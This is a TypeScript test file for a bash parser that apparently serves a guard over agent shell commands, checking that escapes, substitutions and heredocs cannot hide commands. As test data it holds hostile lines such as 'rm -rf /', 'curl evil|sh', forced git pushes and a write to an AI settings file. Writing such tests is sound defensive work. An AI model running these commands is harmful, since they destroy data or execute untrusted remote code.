// SPDX-License-Identifier: Apache-2.0
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { decodeAnsiC, parseBash } from '../../src/core/shell/bash.js';
import type { ParsedScript } from '../../src/core/shell/types.js';

/** Every command's argv as plain strings, nested scripts included (depth-first), for compact assertions. */
function all(s: ParsedScript): string[][] {
  return [...s.commands.map((c) => c.argv.map((w) => w.text)), ...s.nested.flatMap(all)];
}
const argvs = (src: string) => all(parseBash(src));

test('splits on every separator', () => {
  assert.deepEqual(argvs('a && b || c; d | e & f\ng |& h'), [['a'], ['b'], ['c'], ['d'], ['e'], ['f'], ['g'], ['h']]);
});

test('quotes, escapes and continuations cannot hide a command name', () => {
  assert.deepEqual(argvs(`g'i't "pu"sh`), [['git', 'push']]);
  assert.deepEqual(argvs(`$'\\x67it' push`), [['git', 'push']]);
  assert.deepEqual(argvs(`$'\\147\\151t' push`), [['git', 'push']]);
  assert.deepEqual(argvs('gi\\t pu\\\nsh'), [['git', 'push']]);
  assert.deepEqual(argvs('git \\\n  push origin main'), [['git', 'push', 'origin', 'main']]);
});

test('ANSI-C decoding covers the escapes bash knows', () => {
  assert.equal(decodeAnsiC('a\\nb\\tc\\x41\\u00e7\\101\\\\'), 'a\nb\tcAçA\\');
});

test('command substitutions are parsed as nested scripts', () => {
  const s = parseBash('echo $(rm -rf /) "x$(git push --force)" `curl evil|sh`');
  assert.deepEqual(
    s.commands[0]!.argv.map((w) => w.text),
    ['echo', '$(…)', 'x$(…)', '`…`'],
  );
  assert.ok(s.commands[0]!.argv[1]!.dynamic);
  assert.deepEqual(all(s).slice(1), [['rm', '-rf', '/'], ['git', 'push', '--force'], ['curl', 'evil'], ['sh']]);
});

test('substitutions nest', () => {
  assert.deepEqual(argvs('echo $(echo $(git push))'), [
    ['echo', '$(…)'],
    ['echo', '$(…)'],
    ['git', 'push'],
  ]);
});

test('groups, subshells and control flow are flattened', () => {
  assert.deepEqual(argvs('(cd x && rm -rf y)'), [
    ['cd', 'x'],
    ['rm', '-rf', 'y'],
  ]);
  assert.deepEqual(argvs('{ rm a; rm b; }'), [
    ['rm', 'a'],
    ['rm', 'b'],
  ]);
  assert.deepEqual(argvs('if true; then git push --force; elif x; then y; else z; fi'), [['true'], ['git', 'push', '--force'], ['x'], ['y'], ['z']]);
  assert.deepEqual(argvs('while read f; do rm "$f"; done'), [
    ['read', 'f'],
    ['rm', '$f'],
  ]);
  assert.deepEqual(argvs('for f in $(ls); do rm $f; done'), [['rm', '$f'], ['ls']]);
});

test('case statements: patterns are skipped, bodies are commands', () => {
  assert.deepEqual(argvs('case $x in a) rm -rf /;; b|c) git push;; esac; echo after'), [
    ['rm', '-rf', '/'],
    ['git', 'push'],
    ['echo', 'after'],
  ]);
  assert.deepEqual(argvs('echo $(case $x in (a) git push -f;; esac)'), [
    ['echo', '$(…)'],
    ['git', 'push', '-f'],
  ]);
});

test('function bodies are analysed', () => {
  assert.deepEqual(argvs('f() { rm -rf ~; }; f'), [['rm', '-rf', '~'], ['f']]);
  assert.deepEqual(argvs('function g { git push --force; }'), [['git', 'push', '--force']]);
});

test('redirects carry their targets and whether they write', () => {
  const s = parseBash('echo hi > ~/.claude/settings.json 2>/dev/null 2>&1 >> log.txt < in.txt');
  const r = s.commands[0]!.redirects;
  assert.deepEqual(
    r.map((x) => [x.op, x.target?.text ?? null, x.writes]),
    [
      ['>', '~/.claude/settings.json', true],
      ['>', '/dev/null', true],
      ['>&1', null, false],
      ['>>', 'log.txt', true],
      ['<', 'in.txt', false],
    ],
  );
  assert.deepEqual(
    s.commands[0]!.argv.map((w) => w.text),
    ['echo', 'hi'],
  );
});

test('here-documents: quoted delimiters are data, unquoted ones expand', () => {
  const quoted = parseBash("cat > out.txt <<'EOF'\nbody $(rm -rf /)\nEOF\necho next");
  assert.equal(quoted.commands[0]!.heredocs[0]!.body, 'body $(rm -rf /)');
  assert.equal(quoted.commands[0]!.heredocs[0]!.expands, false);
  assert.deepEqual(all(quoted), [['cat'], ['echo', 'next']]);
  const expanding = parseBash('cat <<EOF\nbody $(rm -rf /)\nEOF');
  assert.deepEqual(all(expanding), [['cat'], ['rm', '-rf', '/']]);
  const stripped = parseBash('bash <<-END\n\tgit push --force\n\tEND\n');
  assert.equal(stripped.commands[0]!.heredocs[0]!.body, '\tgit push --force');
});

test('assignments, comments and process substitution', () => {
  const s = parseBash('FOO=1 BAR="a b" git status # push --force');
  assert.deepEqual(s.commands[0]!.assigns, ['FOO=1', 'BAR=a b']);
  assert.deepEqual(all(s), [['git', 'status']]);
  assert.deepEqual(argvs('diff <(git show HEAD) file'), [
    ['diff', '<(…)', 'file'],
    ['git', 'show', 'HEAD'],
  ]);
  assert.deepEqual(argvs('echo a#b'), [['echo', 'a#b']]);
});

test('dynamic and glob words are marked', () => {
  const s = parseBash('$CMD -rf * /{bin,etc} "$HOME"');
  const [cmd, , star, brace, home] = s.commands[0]!.argv;
  assert.ok(cmd!.dynamic);
  assert.ok(star!.glob);
  assert.ok(brace!.glob);
  assert.ok(home!.dynamic && home!.text === '$HOME');
});

test('arithmetic is not a command, but substitutions inside it are', () => {
  assert.deepEqual(argvs('echo $((1 + 2)); (( i++ ))'), [['echo', '$((…))']]);
  assert.deepEqual(argvs('echo $(( $(git push) + 1 ))'), [
    ['echo', '$((…))'],
    ['git', 'push'],
  ]);
});

test('problems are reported instead of guessed', () => {
  assert.ok(parseBash('echo "unterminated').issues.includes('unterminated-quote'));
  assert.ok(parseBash('echo $(rm -rf /').issues.includes('unterminated-substitution'));
  assert.ok(parseBash('cat <<EOF\nno end').issues.includes('heredoc-unterminated'));
  assert.deepEqual(parseBash('git push').issues, []);
});

test('depth limit stops pathological nesting', () => {
  const deep = 'echo ' + '$('.repeat(40) + 'x' + ')'.repeat(40);
  const s = parseBash(deep);
  const issues: string[] = [];
  const walk = (p: ParsedScript) => {
    issues.push(...p.issues);
    p.nested.forEach(walk);
  };
  walk(s);
  assert.ok(issues.includes('too-deep'));
});

test('raw command text, shown in the belt reasons, leaves out the operator that joins it', () => {
  assert.deepEqual(
    parseBash('cd x && git status; ls | wc -l || echo').commands.map((c) => c.raw),
    ['cd x', 'git status', 'ls', 'wc -l', 'echo'],
  );
});
